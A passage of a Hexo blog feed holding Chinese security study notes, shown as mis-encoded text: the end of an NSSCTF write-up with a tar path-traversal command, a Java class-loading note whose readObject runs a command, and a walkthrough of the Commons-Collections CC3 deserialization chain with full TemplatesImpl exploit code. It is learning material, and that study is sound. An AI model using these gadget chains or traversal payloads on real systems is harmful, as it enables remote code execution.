class="string">&#x27;userinfo.json&#x27;</span>]), <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> tFile:</span><br><span class="line">    tFile.write(json.dumps(&#123;<span class="string">&#x27;admin&#x27;</span>: hashlib.sha512(admin_passwd.encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()&#125;).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">userDataDir = os.sep.join([os.getcwd(), <span class="string">&#x27;userData&#x27;</span>])</span><br><span class="line">os.system(<span class="string">f&#x27;cd &quot;<span class="subst">&#123;userDataDir&#125;</span>&quot; &amp;&amp; tar cPzvf upload.tar.gz <span class="subst">&#123;username&#125;</span>/../../conf/userinfo.json&#x27;</span>)</span><br></pre></td></tr></table></figure><h2 id="NSSRound-3-Team-This1sMysql"><a href="#NSSRound-3-Team-This1sMysql" class="headerlink" title="[NSSRound#3 Team]This1sMysql"></a>[NSSRound#3 Team]This1sMysql</h2><p>è€ƒç‚¹</p><p><img src="../images/image-20230330202900747.png" alt="image-20230330202900747"></p><p>é¢˜ç›®</p>]]></content>
      
      
      
        <tags>
            
            <tag> nssctf web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åŠ¨æ€ç±»åŠ è½½</title>
      <link href="/posts/fcb7f5f0.html"/>
      <url>/posts/fcb7f5f0.html</url>
      
        <content type="html"><![CDATA[<p>è§†é¢‘åœ°å€ <a href="https://www.bilibili.com/video/BV16h411z7o9?p=4&amp;vd_source=bacfffe46b930fda5761b63367eb298c">åŠ¨æ€ç±»åŠ è½½</a></p><p><img src="../images/image-20230320171305517.png" alt="image-20230320171305517"></p><p>å­¦ä¹ è¿™ä¸ªä¸œè¥¿å¾—éœ€è¦ä¸¤ä¸ªä»£ç </p><p><strong>Person.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//æ„é€ å‡½æ•°</span></span><br><span class="line">        System.out.println(<span class="string">&quot;æ— å‚person&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> id;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;é™æ€ä»£ç å—&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">staticAction</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;é™æ€æ–¹æ³•&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;æ„é€ ä»£ç å—&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name,<span class="type">int</span> age)</span></span><br><span class="line">    &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;æœ‰å‚person&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.name=name;</span><br><span class="line">        <span class="built_in">this</span>.age=age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">//å¯¹Serializableè¿™ä¸ªæ¥å£é‡Œçš„toStringå‡½æ•°è¿›è¡Œé‡å†™</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Person&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;,age=&quot;</span> + age +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">action</span><span class="params">(String act)</span> <span class="keyword">throws</span> IOException</span><br><span class="line">    &#123;</span><br><span class="line">        System.out.println(act);</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException,ClassNotFoundException</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//é‡æ–°å¯¹readObjectå‡½æ•°è¿›è¡Œé‡å†™ï¼Œç„¶ååœ¨é‡Œé¢åŠ ä¸€æ¡å‘½ä»¤æ‰§è¡Œçš„è¯­å¥ï¼Œè¿™æ ·çš„è¯å°±ä¼šåœ¨ååºåˆ—åŒ–çš„æ—¶å€™å°±ä¼šæ‰§è¡Œï¼Œè¿™æ ·çš„è¯å°±ä¼šé€ æˆå®‰å…¨é—®é¢˜</span></span><br><span class="line">        ois.defaultReadObject();;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>); <span class="comment">//Runtime.getRuntime().exec ç”¨äºè°ƒç”¨å¤–éƒ¨å¯æ‰§è¡Œç¨‹åºæˆ–ç³»ç»Ÿå‘½ä»¤</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å°±æ˜¯ç›¸è¾ƒäºä»¥å‰å¤šäº†(ä¸‹é¢çš„ä¸‰ä¸ªä¸œè¥¿)</p><p><img src="../images/image-20230320165602512.png" alt="image-20230320165602512"></p><p>åœ¨newä¸€ä¸ªæ— å‚å¯¹è±¡çš„æ—¶å€™</p><p><img src="../images/image-20230320165706358.png" alt="image-20230320165706358"></p><p>åœ¨newä¸€ä¸ªæœ‰å‚å¯¹è±¡çš„æ—¶å€™</p><p><img src="../images/image-20230320165748935.png" alt="image-20230320165748935"></p><p>æ˜¯ä¸€æ ·çš„</p><p>éƒ½æ˜¯å…ˆé™æ€ä»£ç å—â€”â€”-&gt;   æ„é€ ä»£ç å—    â€”â€”-&gt;  æœ‰(æ— )å‚æ–¹æ³•</p><p><img src="../images/image-20230320170134879.png" alt="image-20230320170134879"></p><p>å½“è°ƒç”¨ç±»çš„æ–¹æ³•çš„æ—¶å€™ï¼Œå°±ä¸ä¼šè°ƒç”¨å…¶ä»–å…³äºå¯¹è±¡çš„æ–¹æ³•</p><p><img src="../images/image-20230320170226755.png" alt="image-20230320170226755"></p><p>è¿™ä¸‰ä¸ªå°±æ˜¯å’Œå¯¹è±¡ç›¸å…³çš„ï¼Œæ‰€ä»¥ä¸ä¼šè°ƒç”¨</p><p><img src="../images/image-20230320170355436.png" alt="image-20230320170355436"></p><p>åœ¨è°ƒç”¨è¿™ä¸ªé™æ€å˜é‡çš„æ—¶å€™ä¹Ÿè°ƒç”¨äº†è¿™ä¸ªé™æ€ä»£ç å—</p><p>åœ¨ç±»åŠ è½½çš„æ—¶å€™æ˜¯ä¸ä¼šè¿›è¡Œä»»ä½•æ–¹æ³•æˆ–è€…å˜é‡çš„è°ƒç”¨çš„</p><p><img src="../images/image-20230320171803411.png" alt="image-20230320171803411"></p><p>ä¸Šé¢çš„æ–¹æ³•éƒ½æ˜¯å†™æ­»çš„ï¼Œä¸èƒ½è¿›è¡ŒåŠ¨æ€åŠ è½½ï¼Œæ‰€ä»¥è¿™é‡Œæˆ‘ä»¬å°±ç”¨åˆ°äº†ä¹‹å‰åœ¨åå°„é‡Œé¢ç”¨åˆ°çš„æ–¹æ³•      <strong>forName</strong></p><p><img src="../images/image-20230320172620889.png" alt="image-20230320172620889"></p><p>å°±æ˜¯è¿™ä¸ªæ–¹æ³•è¿›è¡Œäº†<strong>åˆå§‹åŒ–</strong>çš„æ“ä½œ   (å·²çŸ¥åˆå§‹åŒ–æ“ä½œä¼šæ‰§è¡Œé™æ€ä»£ç å—)</p><p><img src="../images/image-20230320172703713.png" alt="image-20230320172703713"></p><p>ç„¶åè·Ÿè¿›è¿™ä¸ªforName0çš„æ–¹æ³•ï¼Œè¿™ä¸ªæ–¹æ³•æ˜¯nativeå†™çš„ï¼Œæ˜¯cæ¥å†™çš„</p><p><img src="../images/image-20230320175604207.png" alt="image-20230320175604207"></p><p>ä»–é‡Œé¢æœ‰å‡ ä¸ªå‚æ•°</p><p>ç¬¬ä¸€ä¸ªæ˜¯ä¼ ç±»åï¼Œç¬¬äºŒä¸ªæ˜¯åˆ¤æ–­æ˜¯å¦åˆå§‹åŒ–ï¼Œç¬¬ä¸‰ä¸ªæ˜¯ç±»åŠ è½½å™¨ï¼Œç¬¬å››ä¸ªä¸é‡è¦</p><p>å› ä¸ºforNameé‡Œé¢é»˜è®¤çš„æ˜¯å¦åˆå§‹åŒ–æ˜¯trueï¼Œæ‰€ä»¥å¦‚æœæƒ³è®©ä»–ä¸è¿›è¡Œåˆå§‹åŒ–çš„è¯ï¼Œå°±ä¼ å€¼ï¼Œå› ä¸ºClassè¿™ä¸ªç±»é‡Œè¾¹è¿˜æœ‰å¦ä¸€ä¸ªforName</p><p><img src="../images/image-20230320180218646.png" alt="image-20230320180218646"></p><p>å› ä¸ºClassLoaderæ˜¯ä¸€ä¸ªæŠ½è±¡ç±»ï¼Œä¸èƒ½å®ä¾‹åŒ–ï¼Œä½†æ˜¯ä»–æœ‰ä¸ªé™æ€æ–¹æ³•æ˜¯å¯ä»¥å®ä¾‹åŒ–çš„</p><p><img src="../images/image-20230320180742675.png" alt="image-20230320180742675"></p><p>è¿™é‡Œåªä¼ ä¸‰ä¸ªå‚æ•°æ˜¯å› ä¸ºforNameåªæœ‰ä¸‰ä¸ªå‚æ•°ï¼ŒforName0æ‰æ˜¯æœ‰å››ä¸ªå‚æ•°çš„</p><p>è¿™æ ·å†™å°±ä¸èƒ½è¿›è¡Œå®ä¾‹åŒ–å’Œåˆå§‹åŒ–äº†</p><p>æˆ‘ä»¬å¯ä»¥åˆ©ç”¨åå°„é‡Œé¢å­¦çš„newIntance()æ–¹æ³•æ¥è¿›è¡Œå®ä¾‹åŒ–å’Œåˆå§‹åŒ–äº†</p><p><img src="../images/image-20230320183317612.png" alt="image-20230320183317612"></p><p><strong>ä¸Šé¢å¤§æ¦‚ä»‹ç»å®Œå°±å¼€å§‹è®²è¿™ä¸ªç±»åŠ è½½å™¨çš„ä¸œè¥¿äº†</strong></p><p><img src="../images/image-20230320184323015.png" alt="image-20230320184323015"></p><p>å°±æ˜¯åˆ©ç”¨è¿™ä¸ªåŠ¨æ€ç±»åŠ è½½æ¥è¿›è¡Œå®ä¾‹åŒ–å¯¹è±¡(<strong>è¿™é‡Œè¯´æ˜ä¸€ä¸‹è¿™ä¸ªloadClassæ˜¯ä¸è¿›è¡Œåˆå§‹åŒ–çš„</strong>)</p><p><img src="../images/image-20230320184435751.png" alt="image-20230320184435751"></p><p>ä¸Šé¢æ˜¯ç®€å•çš„ä»‹ç»ï¼Œè¯¦ç»†çš„çœ‹è¿™ç¯‡æ–‡ç«       <a href="https://zhuanlan.zhihu.com/p/567962697">åŠ¨æ€ç±»åŠ è½½</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> java åŠ¨æ€ç±»åŠ è½½ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>javaååºåˆ—åŒ–-cc3</title>
      <link href="/posts/a68e45f7.html"/>
      <url>/posts/a68e45f7.html</url>
      
        <content type="html"><![CDATA[<p>cc3è¿™æ¡é“¾å’Œå‰é¢çš„cc1å’Œcc6æ˜¯ä¸åŒçš„ï¼Œè¿™ä¸ªæ‰§è¡Œå‘½ä»¤ç”¨çš„æ˜¯<strong>åŠ¨æ€ç±»åŠ è½½</strong></p><p>ä¸æ˜¯Runtime.getRuntime.exec()</p><p>æ‰€ä»¥è¯´å­¦è¿™æ¡é“¾å­ä¹‹å‰å¾—å»å­¦ä¸‹å•¥æ˜¯åŠ¨æ€ç±»åŠ è½½</p><p> å› ä¸ºåŠ¨æ€ç±»åŠ è½½çš„æ—¶å€™ä¼šè°ƒç”¨loadclassï¼Œç„¶åloadclassæœ€åå°±ä¼šè°ƒç”¨åˆ°defineclass,ç„¶åå› ä¸ºæœ€åè°ƒç”¨çš„defineclassä¸æ˜¯publicçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å¾—å»æ‰¾å“ªä¸ªç±»é‡Œè¾¹é‡å†™äº†è¿™ä¸ªå‡½æ•°ï¼Œå¹¶ä¸”æ˜¯publicçš„</p><p><img src="../images/image-20230321221053484.png" alt="image-20230321221053484"></p><p>è¿™ä¸ªå‡½æ•°å‚æ•°çš„æ‰¾ä¸åˆ°æœ‰é‡å†™ç„¶åæ˜¯publicçš„è°ƒç”¨ä»–</p><p>ç„¶åå‘ç°äº†è¿™ç§ç±»å‹çš„defineclassæœ‰å‡½æ•°è°ƒç”¨</p><p><img src="../images/image-20230321221604507.png" alt="image-20230321221604507"></p><p>ç„¶åè¿˜æ˜¯defaultç±»å‹çš„(è¿™ä¸ªç±»å‹è¯´æ˜äº†è¿™ä¸ªåŒ…é‡Œå¯ä»¥è°ƒç”¨ä»–)</p><p>ç„¶åæˆ‘ä»¬è·Ÿè¿›å»ï¼Œçœ‹è°è°ƒç”¨äº†è¿™ä¸ªdefaultçš„defineclass</p><p><img src="../images/image-20230321221849460.png" alt="image-20230321221849460"></p><p>åœ¨ä»–è‡ªèº«ç±»é‡Œè¾¹çš„è¿™ä¸ªå‡½æ•°è°ƒç”¨äº†defaultæ–¹æ³•ï¼Œä½†æ˜¯è¿™ä¸ªæ˜¯privateçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å°±ç»§ç»­æ‰¾å“ªä¸ªpublicè°ƒç”¨äº†ä»–</p><p><img src="../images/image-20230321222150282.png" alt="image-20230321222150282"></p><p>ç„¶åæ‰¾åˆ°äº†ä¸€ä¸ªprivateæ–¹æ³•é‡Œé¢æœ‰ä¸ªå®ä¾‹åŒ–çš„æ–¹æ³•ï¼Œ</p><p>æ‰€ä»¥æˆ‘ä»¬å°±æ¥ç€å¾€ä¸‹æ‰¾ï¼Œæ‰¾å“ªä¸ªpublicæ–¹æ³•é‡Œé¢è°ƒç”¨äº†ä»–</p><p><img src="../images/image-20230321222331758.png" alt="image-20230321222331758"></p><p>æœ€åæ‰¾åˆ°è¿™ä¸ªpublicå°±æ‰¾å®Œäº†</p><p>ç„¶åæˆ‘ä»¬å°±å¾—æƒ³æƒ³æ€ä¹ˆæ§åˆ¶è¿™ä¸ªå®ä¾‹åŒ–å¯¹è±¡</p><p><img src="../images/image-20230322194209379.png" alt="image-20230322194209379"></p><p>ç„¶åçœ‹åˆ°ä¸Šå›¾å°±çœ‹åˆ°äº†defineTransletClasses()è¿™ä¸ªå‡½æ•°æ–¹æ³•æ˜¯å¯ä»¥èµ‹å€¼ä¼ å‚çš„</p><p><img src="../images/image-20230322194315725.png" alt="image-20230322194315725"></p><p>åœ¨æ»¡è¶³ä¸Šé¢çš„æ¡ä»¶åå°±å¯ä»¥è¿›è¡Œèµ‹å€¼äº†</p><p>é€šè¿‡ä¸Šé¢çš„å¯»æ‰¾ï¼Œå‘ç°æ‰¾çš„å‡½æ•°æ–¹æ³•å…¨åœ¨TemplatesImpIè¿™ä¸ªç±»é‡Œè¾¹ï¼Œå¹¶ä¸”è¿™ä¸ªç±»è¿˜å¯ä»¥è¿›è¡Œåºåˆ—åŒ–ï¼Œé‚£ä¹ˆè¿™ä¸ªé‡Œé¢é‡Œè¾¹çš„å‚æ•°æˆ‘ä»¬å°±éƒ½å¯ä»¥è¿›è¡Œæ§åˆ¶äº†(åå°„)</p><p><img src="../images/image-20230322194840494.png" alt="image-20230322194840494"></p><p><strong>ç¬¬ä¸€æ­¥çš„å‡ºå‘ç‚¹</strong>ï¼Œ<strong>å¾—ç”¨è¿™ä¸ªæ¥è§¦å‘defineClass</strong></p><p><img src="../images/image-20230322195037005.png" alt="image-20230322195037005"></p><p><img src="../images/image-20230322195128556.png" alt="image-20230322195128556"></p><p><img src="../images/image-20230322195140695.png" alt="image-20230322195140695"></p><p>è¿™é‡Œè¯æˆ‘ä»¬æ˜¯æƒ³å…ˆå»è°ƒç”¨ç¬¬äºŒä¸ªifé‡Œè¾¹çš„å‡½æ•°æ–¹æ³•ï¼Œæ¥ç»™ä¸‹é¢çš„å®ä¾‹åŒ–å¯¹è±¡èµ‹å€¼</p><p>è·Ÿè¿›è¿™ä¸ªå‡½æ•°å(å°±ä¼šå‘ç°æœ‰ä¸¤ä¸ªifå¿…é¡»æ»¡è¶³ï¼Œå› ä¸ºç¬¬ä¸€ä¸ªå¦‚æœä¸æ»¡è¶³çš„è¯å°±ä¼šæŠ›å¼‚å¸¸ï¼Œç¬¬äºŒä¸ªæ˜¯å› ä¸ºå¾—ç»™ä»–èµ‹å€¼è®©ä»–è°ƒç”¨å‡½æ•°æ–¹æ³•)<strong>è¿™é‡Œèµ‹å€¼çš„åŸå› æ˜¯å› ä¸ºè¿™ä¸ªTemplatesImpIç±»çš„æ„é€ å‡½æ•°æ²¡æœ‰è¿›è¡Œèµ‹å€¼</strong></p><p><img src="../images/image-20230322195459426.png" alt="image-20230322195459426"></p><p>æ‰€ä»¥æ¥ä¸‹æ¥æˆ‘ä»¬å¼€å§‹è¿›è¡Œèµ‹å€¼ï¼Œå…ˆä»getTransletInstance()è¿™ä¸ªå‡½æ•°å¼€å§‹ï¼Œå°±æ˜¯çŒ®ç»™nameèµ‹å€¼</p><p>ç„¶åå†ç»™_bytecodesèµ‹å€¼,å› ä¸ºå°±æ˜¯ä¸èƒ½è®©ä»–æŠ›å¼‚å¸¸(è¿™é‡Œç»™bytecodesèµ‹å€¼æ˜¯æœ‰è®²ç©¶çš„)å®ä¾‹åŒ–æ—¶éœ€è¦çš„ç±»æ˜¯ç”±bytecodesèµ‹å€¼çš„ï¼Œè€Œä¸”è¿˜ç”±äºæœ€åçš„defineclass()å‡½æ•°ï¼Œè¿™é‡Œçš„è¯bytecodesçš„ç±»å‹è¿˜æ˜¯å¾—è¿›è¡Œé™åˆ¶çš„</p><p><img src="../images/image-20230322201130287.png" alt="image-20230322201130287"></p><p><img src="../images/image-20230322201336724.png" alt="image-20230322201336724"></p><p><img src="../images/image-20230322201345186.png" alt="image-20230322201345186"></p><p>æœ€åå†™å‡ºæ¥çš„æˆæœ</p><p>å› ä¸ºç±»é‡Œè¾¹çš„bytecodesæ˜¯ä¸ªäºŒç»´æ•°ç»„ï¼Œæ‰€ä»¥åˆå§‹åŒ–çš„æ—¶å€™å°±å…ˆç»™ä»–å˜ä¸ºäºŒç»´æ•°ç»„ï¼Œç„¶åå› ä¸ºå¾—éœ€è¦ä»–çš„ä¸€ç»´æ•°ç»„è¿›è¡Œèµ‹å€¼ï¼Œæ‰€ä»¥åœ¨åµŒå¥—ä¸€ä¸ªä¸€ç»´æ•°ç»„</p><p>ç„¶åæœ€åè¿˜æœ‰ä¸€ä¸ª_tfactoryæ²¡æœ‰è¿›è¡Œèµ‹å€¼ï¼Œæ‰€ä»¥æˆ‘ä»¬å°±å¾—å¯¹ä»–è¿›è¡Œèµ‹å€¼ï¼Œä¸ç„¶ä¼šæŠ¥é”™</p><p><img src="../images/image-20230322202030498.png" alt="image-20230322202030498"></p><p>è¿™å°±æ˜¯ä»–çš„ç±»å‹(ç„¶åè¿™ä¸ªå‚æ•°æ˜¯transientï¼Œå°±æ˜¯ä¸å¯ä»¥è¿›è¡Œåºåˆ—åŒ–çš„æ„æ€)</p><p>æ‰€ä»¥æˆ‘ä»¬å°±çŒœå®ƒæ˜¯åœ¨readObjecté‡Œé¢è¿›è¡Œèµ‹å€¼çš„</p><p><img src="../images/image-20230322202306042.png" alt="image-20230322202306042"></p><p>æœ€ä¸‹é¢å°±çœ‹åˆ°å®ƒäº†</p><p><img src="../images/image-20230322202519552.png" alt="image-20230322202519552"></p><p>èµ‹å€¼æˆåŠŸ</p><p>ç„¶åè¿è¡Œå‘ç°æ²¡æˆåŠŸ(å‘ç°åœ¨defineTransletClassesè¿™ä¸ªå‡½æ•°é‡Œè¾¹çš„ä¸‹é¢é‚£ä¸ªå‚æ•°ä¸ºç©ºï¼Œç„¶åçˆ†äº†ç©ºæŒ‡é’ˆé”™è¯¯)</p><p><img src="../images/image-20230322203013541.png" alt="image-20230322203013541"></p><p>ä½†æ˜¯å•ä¼‘æ”¹è¿™ä¸ªå‚æ•°æ²¡å•¥å¤§çš„æ„ä¹‰ï¼Œå› ä¸ºtransletIndexå€¼ä¸º-1ï¼Œåˆ°äº†ä¸‹é¢çš„ifåˆ¤æ–­è¿˜æ˜¯ä¼šæŠ›å¼‚å¸¸å‡ºé”™</p><p><img src="../images/image-20230322203529965.png" alt="image-20230322203529965"></p><p>æ‰€ä»¥æˆ‘ä»¬å°±å…ˆå¾—æ»¡è¶³è¿™ä¸ª</p><p><img src="../images/image-20230322203759237.png" alt="image-20230322203759237"></p><p>è®©ä»–çš„å€¼ä¸ä¸º-1ï¼Œç„¶åè·Ÿè¿›å»åå‘ç°</p><p><img src="../images/image-20230322203953283.png" alt="image-20230322203953283"></p><p>è¿™é‡Œè¦æ±‚è¦å’ŒsuperClassé‡Œé¢çš„ç±»ç›¸ç­‰ï¼Œæ‰€ä»¥æˆ‘ä»¬å°±å¾—åœ¨å¼¹è®¡ç®—å™¨çš„ç±»é‡Œè¾¹æ›´æ”¹</p><p><strong>cc3å®Œæ•´ä»£ç </strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Path;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc3</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span><br><span class="line">    &#123;</span><br><span class="line">           <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">           <span class="type">Class</span> <span class="variable">tc</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">           <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">           field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">           field.set(templates,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">           <span class="type">Field</span> <span class="variable">field1</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">           field1.setAccessible(<span class="literal">true</span>);</span><br><span class="line">           <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;D://tmp/test.class&quot;</span>));</span><br><span class="line">           <span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">           field1.set(templates,codes);</span><br><span class="line">           <span class="type">Field</span> <span class="variable">field2</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">           field2.setAccessible(<span class="literal">true</span>);</span><br><span class="line">           field2.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">           templates.newTransformer();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>test.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;notepad&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ä¸Šé¢å†™çš„ä»£ç æ˜¯å¯¹è¿™æ¡é“¾å­çš„ä¸€ä¸ªåŸºæœ¬è§£é‡Šï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬ç”¨cc1é‡Œçš„æ–¹æ³•æ¥å¯¹ä¸Šé¢çš„ä»£ç è¿›è¡Œååºåˆ—åŒ–æ“ä½œ</p><p><img src="../images/image-20230322214845664.png" 